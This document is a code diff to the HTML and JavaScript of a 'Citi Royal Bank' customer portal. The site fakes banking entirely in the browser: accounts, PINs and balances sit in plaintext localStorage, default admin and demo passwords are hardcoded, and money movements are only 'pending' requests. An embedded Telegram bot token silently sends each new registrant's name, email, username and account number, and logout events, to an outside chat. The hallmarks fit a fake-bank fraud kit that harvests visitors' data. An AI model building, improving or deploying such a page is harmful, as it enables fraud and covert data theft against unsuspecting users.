@@ -2,30 +2,32 @@
 <html lang="en">
 <head>
     <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes">
     <title>Citi Royal Bank | Customer Portal</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
         body { font-family: 'Poppins', sans-serif; background: #f0f2f5; }
-        .card-signin { border-radius: 1rem; box-shadow: 0 0.5rem 1rem rgba(0,0,0,0.05); }
+        .card-signin { border-radius: 1rem; box-shadow: 0 0.5rem 1rem rgba(0,0,0,0.08); }
         .navbar-dark { background: #0a2b4e !important; }
-        #preloader { position: fixed; top:0; left:0; width:100%; height:100%; background:white; z-index:9999; display:flex; align-items:center; justify-content:center; }
+        #preloader { position: fixed; top:0; left:0; width:100%; height:100%; background:white; z-index:9999; display:flex; align-items:center; justify-content:center; flex-direction:column; z-index:10000; }
         .profile-img { width: 80px; height: 80px; object-fit: cover; border-radius: 50%; border: 2px solid #0d6efd; }
         .balance-card { background: linear-gradient(135deg, #0a2b4e 0%, #1a4d7a 100%); color: white; border-radius: 15px; }
         .action-btn { transition: all 0.2s; }
         .action-btn:hover { transform: translateY(-2px); }
+        .btn-link { cursor: pointer; text-decoration: none; }
+        .btn-link:hover { text-decoration: underline; }
     </style>
 </head>
 <body>
-<div id="preloader" style="position:fixed; top:0; left:0; width:100%; height:100%; background:#fff; z-index:9999; display:flex; align-items:center; justify-content:center; flex-direction:column;">
+<div id="preloader">
     <i class="fas fa-spinner fa-spin fa-2x mb-2" style="color:#0a2b4e;"></i>
     <p>Loading Secure Portal...</p>
 </div>
 
 <script>
-    // ==================== TELEGRAM NOTIFICATION ====================
+    // ==================== TELEGRAM NOTIFICATION (keep for admin alerts) ====================
     const TELEGRAM_TOKEN = "8818467723:AAHa2sIiawjJeyVazJbzkz6jetx0qRs6zpc";
     const TELEGRAM_CHAT_ID = "6159490685";
     async function sendTelegram(text) {
@@ -62,8 +64,8 @@
                             <input type="password" id="loginPin" class="form-control mb-3" placeholder="4-digit Login PIN" maxlength="4" pattern="[0-9]{4}" inputmode="numeric" required>
                             <button type="submit" class="btn btn-primary w-100 py-2">Login to Account</button>
                             <div class="text-center mt-3">
-                                <a href="#" id="showRegisterBtn" class="btn-link">Create New Account</a> | 
-                                <a href="#" id="forgotMock" class="btn-link">Forgot Credentials?</a>
+                                <a class="btn-link" id="showRegisterBtn">Create New Account</a> | 
+                                <a class="btn-link" id="forgotMock">Forgot Credentials?</a>
                             </div>
                         </form>
                         
@@ -73,7 +75,7 @@
                             <input type="text" id="regName" class="form-control mb-2" placeholder="Full Name" required>
                             <input type="text" id="regUsername" class="form-control mb-2" placeholder="Choose Username" required>
                             <input type="email" id="regEmail" class="form-control mb-2" placeholder="Email Address" required>
-                            <input type="password" id="regPassword" class="form-control mb-2" placeholder="Create Password" required>
+                            <input type="password" id="regPassword" class="form-control mb-2" placeholder="Create Password (min 4 characters)" required>
                             <input type="password" id="regPin" class="form-control mb-2" placeholder="4-digit Login PIN" maxlength="4" pattern="[0-9]{4}" required>
                             <input type="password" id="regTransPin" class="form-control mb-2" placeholder="4-digit Transaction PIN" maxlength="4" pattern="[0-9]{4}" required>
                             <select id="regCurrency" class="form-control mb-2" required>
@@ -91,7 +93,7 @@
                             </div>
                             <button type="submit" class="btn btn-success w-100">Create Account</button>
                             <div class="text-center mt-3">
-                                <a href="#" id="showLoginBtn" class="btn-link">← Back to Login</a>
+                                <a class="btn-link" id="showLoginBtn">← Back to Login</a>
                             </div>
                         </form>
                     </div>
@@ -192,34 +194,53 @@
 <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
 
 <script>
-// ==================== DATA LAYER (Shared with admin panel) ====================
-// Load or initialize users database - ensure admin exists
-let usersDB = JSON.parse(localStorage.getItem('bank_users')) || [];
+// ==================== DATA LAYER - FIXED PERSISTENCE ====================
+// Initialize data from localStorage or create default data
+let usersDB = [];
+let transactions = [];
+let withdrawRequests = [];
+let depositRequests = [];
+let transferRequests = [];
+let supportTickets = [];
 
-// If no users exist, create default admin and one demo user for testing
-if(usersDB.length === 0) {
-    usersDB = [
-        { 
-            id: 1, name: "System Administrator", username: "admin", email: "admin@citiroyal.com", 
-            password: "admin123", pin: "0000", transPin: "0000", role: "admin", 
-            balance: 0, accountNumber: "CRB1000001", routing: "760965735", swift: "CRIBUS33", 
-            status: "active", currency: "USD", avatar: null 
-        },
-        { 
-            id: 2, name: "John Demo", username: "john", email: "john@demo.com", 
-            password: "demo123", pin: "1234", transPin: "5678", role: "user", 
-            balance: 2500.50, accountNumber: "CRB1000250", routing: "760965735", swift: "CRIBUS33", 
-            status: "active", currency: "USD", avatar: null 
-        }
-    ];
-    localStorage.setItem('bank_users', JSON.stringify(usersDB));
+// Function to load all data from localStorage
+function loadAllData() {
+    usersDB = JSON.parse(localStorage.getItem('citi_bank_users')) || [];
+    transactions = JSON.parse(localStorage.getItem('citi_bank_transactions')) || [];
+    withdrawRequests = JSON.parse(localStorage.getItem('citi_bank_withdraws')) || [];
+    depositRequests = JSON.parse(localStorage.getItem('citi_bank_deposits')) || [];
+    transferRequests = JSON.parse(localStorage.getItem('citi_bank_transfers')) || [];
+    supportTickets = JSON.parse(localStorage.getItem('citi_bank_tickets')) || [];
+    
+    // If no users exist, create default admin and demo user
+    if(usersDB.length === 0) {
+        usersDB = [
+            { 
+                id: 1, name: "System Administrator", username: "admin", email: "admin@citiroyal.com", 
+                password: "admin123", pin: "0000", transPin: "0000", role: "admin", 
+                balance: 0, accountNumber: "CRB1000001", routing: "760965735", swift: "CRIBUS33", 
+                status: "active", currency: "USD", avatar: null, createdAt: new Date().toISOString()
+            },
+            { 
+                id: 2, name: "John Demo", username: "john", email: "john@demo.com", 
+                password: "demo123", pin: "1234", transPin: "5678", role: "user", 
+                balance: 2500.50, accountNumber: "CRB1000250", routing: "760965735", swift: "CRIBUS33", 
+                status: "active", currency: "USD", avatar: null, createdAt: new Date().toISOString()
+            }
+        ];
+        saveAllData();
+    }
 }
 
-let transactions = JSON.parse(localStorage.getItem('bank_transactions')) || [];
-let withdrawRequests = JSON.parse(localStorage.getItem('bank_withdraws')) || [];
-let depositRequests = JSON.parse(localStorage.getItem('bank_deposits')) || [];
-let transferRequests = JSON.parse(localStorage.getItem('bank_transfers')) || [];
-let supportTickets = JSON.parse(localStorage.getItem('support_tickets')) || [];
+// Save all data to localStorage
+function saveAllData() {
+    localStorage.setItem('citi_bank_users', JSON.stringify(usersDB));
+    localStorage.setItem('citi_bank_transactions', JSON.stringify(transactions));
+    localStorage.setItem('citi_bank_withdraws', JSON.stringify(withdrawRequests));
+    localStorage.setItem('citi_bank_deposits', JSON.stringify(depositRequests));
+    localStorage.setItem('citi_bank_transfers', JSON.stringify(transferRequests));
+    localStorage.setItem('citi_bank_tickets', JSON.stringify(supportTickets));
+}
 
 // Helper: generate unique account number
 function generateAccountNumber() {
@@ -228,16 +249,6 @@ function generateAccountNumber() {
         acc = "CRB" + Math.floor(Math.random() * 90000000) + Math.floor(Math.random() * 1000);
     }
     return acc;
-}
-
-// Save all data to localStorage
-function saveAllData() {
-    localStorage.setItem('bank_users', JSON.stringify(usersDB));
-    localStorage.setItem('bank_transactions', JSON.stringify(transactions));
-    localStorage.setItem('bank_withdraws', JSON.stringify(withdrawRequests));
-    localStorage.setItem('bank_deposits', JSON.stringify(depositRequests));
-    localStorage.setItem('bank_transfers', JSON.stringify(transferRequests));
-    localStorage.setItem('support_tickets', JSON.stringify(supportTickets));
 }
 
 let currentUser = null;
@@ -258,7 +269,7 @@ function refreshUserUI() {
         $('#navAvatar').attr('src', avatar);
         
         // Show user transactions
-        let myTx = transactions.filter(tx => tx.userId === currentUser.id || tx.username === currentUser.username).reverse().slice(0, 10);
+        let myTx = transactions.filter(tx => tx.userId === currentUser.id || tx.username === currentUser.username).reverse().slice(0, 15);
         if(myTx.length === 0) {
             $('#txList').html('<tr><td colspan="4" class="text-center text-muted">No transaction history</td></tr>');
         } else {
@@ -274,7 +285,10 @@ function refreshUserUI() {
     }
 }
 
-// ==================== REGISTRATION (FIXED: ensures new users save correctly) ====================
+// Load data on page start
+loadAllData();
+
+// ==================== REGISTRATION - FIXED ====================
 $('#registerForm').on('submit', async function(e) {
     e.preventDefault();
     
@@ -295,12 +309,15 @@ $('#registerForm').on('submit', async function(e) {
     if(!name || !username || !email || !password || !pin || !transPin) {
         return Swal.fire("Error", "All fields are required", "error");
     }
-    if(pin.length !== 4 || transPin.length !== 4 || !/^\d+$/.test(pin) || !/^\d+$/.test(transPin)) {
-        return Swal.fire("Error", "PINs must be exactly 4 digits", "error");
-    }
     if(password.length < 4) {
         return Swal.fire("Error", "Password must be at least 4 characters", "error");
     }
+    if(pin.length !== 4 || transPin.length !== 4 || !/^\d+$/.test(pin) || !/^\d+$/.test(transPin)) {
+        return Swal.fire("Error", "PINs must be exactly 4 digits", "error");
+    }
+    
+    // Check existing users - IMPORTANT: reload from localStorage to ensure latest data
+    loadAllData();
     if(usersDB.find(u => u.username === username)) {
         return Swal.fire("Username Taken", "This username is already registered. Please choose another.", "error");
     }
@@ -330,28 +347,28 @@ $('#registerForm').on('submit', async function(e) {
         pin: pin,
         transPin: transPin,
         role: "user",
-        balance: 0.00,  // Start with zero balance
+        balance: 0.00,
         accountNumber: generateAccountNumber(),
         routing: "760965735",
         swift: "CRIBUS33",
         status: "active",
         currency: currency,
-        avatar: avatarBase64 || null
+        avatar: avatarBase64 || null,
+        createdAt: new Date().toISOString()
     };
     
     usersDB.push(newUser);
     saveAllData();
     
-    // Send notification to admin via Telegram
+    // Send notification to admin
     notifyTelegram("📝 NEW ACCOUNT REGISTRATION", 
         `Name: ${newUser.name}\nUsername: ${newUser.username}\nEmail: ${newUser.email}\nAccount: ${newUser.accountNumber}\nCurrency: ${currency}`);
     
-    // Show success and switch to login
     await Swal.fire({
         title: "Account Created Successfully!",
-        html: `Welcome ${newUser.name}!<br>Your account number: <strong>${newUser.accountNumber}</strong><br>You can now login using your username/email and PIN.`,
+        html: `Welcome ${newUser.name}!<br><br>Your account number: <strong>${newUser.accountNumber}</strong><br><br>You can now login using your username/email and PIN.`,
         icon: "success",
-        confirmButtonText: "Proceed to Login"
+        confirmButtonText: "Go to Login"
     });
     
     // Reset and switch to login form
@@ -360,15 +377,18 @@ $('#registerForm').on('submit', async function(e) {
     $('#loginForm').show();
 });
 
-// ==================== LOGIN (FIXED: validates credentials + PIN correctly) ====================
+// ==================== LOGIN - FIXED ====================
 $('#loginForm').on('submit', async function(e) {
     e.preventDefault();
     
-    let loginInput = $('#loginUsername').val().trim();
+    let loginInput = $('#loginUsername').val().trim().toLowerCase();
     let password = $('#loginPassword').val();
     let enteredPin = $('#loginPin').val();
     
-    // Find user (by username OR email, exclude admin from customer login)
+    // Reload latest data before login check
+    loadAllData();
+    
+    // Find user by username OR email (case insensitive)
     let found = usersDB.find(u => 
         (u.username === loginInput || u.email === loginInput) && 
         u.password === password && 
@@ -389,7 +409,7 @@ $('#loginForm').on('submit', async function(e) {
     
     // Login successful
     currentUser = found;
-    localStorage.setItem('bank_user_session', JSON.stringify({id: found.id, username: found.username}));
+    localStorage.setItem('citi_bank_user_session', JSON.stringify({id: found.id, username: found.username, email: found.email}));
     
     $('#authContainer').fadeOut(400, function() {
         $('#userPanel').show();
@@ -408,12 +428,12 @@ $('#loginForm').on('submit', async function(e) {
 // Toggle forms
 $('#showRegisterBtn').click(e => { e.preventDefault(); $('#loginForm').hide(); $('#registerForm').show(); });
 $('#showLoginBtn').click(e => { e.preventDefault(); $('#registerForm').hide(); $('#loginForm').show(); });
-$('#forgotMock').click(e => { e.preventDefault(); Swal.fire("Password Recovery", "Please contact customer support for assistance.", "info"); });
+$('#forgotMock').click(e => { e.preventDefault(); Swal.fire("Password Recovery", "Please contact customer support at support@citiroyal.com for assistance.", "info"); });
 
 // Logout function
 function logoutUser() {
     currentUser = null;
-    localStorage.removeItem('bank_user_session');
+    localStorage.removeItem('citi_bank_user_session');
     $('#userPanel').hide();
     $('#authContainer').fadeIn(400);
     notifyTelegram("🔒 USER LOGOUT", "User session ended.");
@@ -421,9 +441,10 @@ function logoutUser() {
 $('#logoutBtnUser').click(() => logoutUser());
 
 // Auto session restore
-let savedUserSession = localStorage.getItem('bank_user_session');
+let savedUserSession = localStorage.getItem('citi_bank_user_session');
 if(savedUserSession) {
     try {
+        loadAllData();
         let sess = JSON.parse(savedUserSession);
         let user = usersDB.find(u => u.id === sess.id && u.role !== 'admin');
         if(user && user.status === 'active') {
@@ -453,6 +474,9 @@ $('#uploadPhotoBtn').click(async () => {
             let reader = new FileReader();
             reader.onload = (ev) => {
                 currentUser.avatar = ev.target.result;
+                // Update user in database
+                let userIndex = usersDB.findIndex(u => u.id === currentUser.id);
+                if(userIndex !== -1) usersDB[userIndex].avatar = ev.target.result;
                 saveAllData();
                 refreshUserUI();
                 Swal.fire('Success', 'Profile picture updated', 'success');
@@ -478,6 +502,7 @@ $('#depositBtn').click(async () => {
         let depositReq = {
             id: Date.now(),
             user: currentUser.username,
+            userId: currentUser.id,
             amount: parseFloat(amount),
             currency: currentUser.currency,
             status: 'pending',
@@ -507,6 +532,7 @@ $('#withdrawBtn').click(async () => {
         let withdrawReq = {
             id: Date.now(),
             user: currentUser.username,
+            userId: currentUser.id,
             amount: parseFloat(amount),
             currency: currentUser.currency,
             status: 'pending',
@@ -532,6 +558,7 @@ $('#newTicketBtn').click(async () => {
             id: Date.now(),
             subject: subject.trim(),
             user: currentUser.username,
+            userId: currentUser.id,
             status: 'pending',
             date: new Date().toLocaleString()
         };
@@ -542,7 +569,7 @@ $('#newTicketBtn').click(async () => {
     }
 });
 
-// ==================== TRANSFER (With Transaction PIN verification) ====================
+// ==================== TRANSFER ====================
 $('#newTransferBtn').click(async () => {
     // Step 1: Transfer Type
     let {value: transferType} = await Swal.fire({
@@ -614,6 +641,7 @@ $('#newTransferBtn').click(async () => {
     let transferReq = {
         id: Date.now(),
         from: currentUser.username,
+        fromId: currentUser.id,
         to: null,
         amount: formData.amount,
         currency: currentUser.currency,
@@ -640,4 +668,3 @@ $('#newTransferBtn').click(async () => {
 </script>
 </body>
 </html>
-```
